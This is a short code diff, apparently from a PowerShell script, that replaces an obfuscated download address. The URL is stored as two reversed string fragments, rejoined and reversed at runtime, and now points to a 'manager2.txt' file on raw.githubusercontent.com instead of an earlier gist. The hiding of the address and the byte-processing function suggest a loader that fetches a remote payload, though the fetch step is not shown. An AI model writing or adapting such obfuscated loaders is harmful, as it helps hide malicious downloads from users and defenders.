@@ -23,8 +23,8 @@ function Process-Byte {
     return $t
 }
 
-$part1 = "txt.reganam/f20dbf9d0648f2ef77e1edb33094664b49751d21/war/e297041b5707e"
-$part2 = "6e3bf480a5d69bcc5ee/edoc-491tsallod/moc.tnetnocresubuhtig.tsig//:sptth"
+$part1 = "txt.2reganam/niam/sswen"
+$part2 = "/ccaatohc/moc.tnetnocresubuhtig.war//:sptth"
 
 $reversed = $part1 + $part2
 $url = -join $reversed[($reversed.Length-1)..0]
